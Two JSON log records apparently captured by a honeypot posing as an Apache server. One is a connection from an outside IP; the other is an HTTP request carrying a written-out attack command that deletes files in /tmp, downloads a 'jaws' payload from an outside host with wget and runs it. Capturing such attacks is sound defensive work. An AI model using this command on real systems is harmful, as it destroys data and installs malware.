{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-07T02:22:21.689877","parsedMessage":{"timestamp":"2023-03-07 02:22:21.689877","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 103.178.228.226:53718 to port 80","ip":"103.178.228.226"},"id":"89748bc7-212d-424a-a009-a083b246a953","EventProcessedUtcTime":"2023-03-07T02:22:22.1699457Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-07T02:22:21.9530000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/103.178.228.226"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Tue Mar  7 02:23:02 UTC 2023","parsedMessage":{"timestamp":"2023-03-07 02:22:21+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"103.178.228.226 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+45.77.243.49/jaws;sh+/tmp/jaws HTTP/1.1\" 404 488 \"-\" \"Hello, world\"","ip":"103.178.228.226"},"id":"56a85bae-a3c9-4508-b91e-2564a5fd36d8","EventProcessedUtcTime":"2023-03-07T02:23:02.5293609Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-07T02:23:02.3610000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/103.178.228.226"}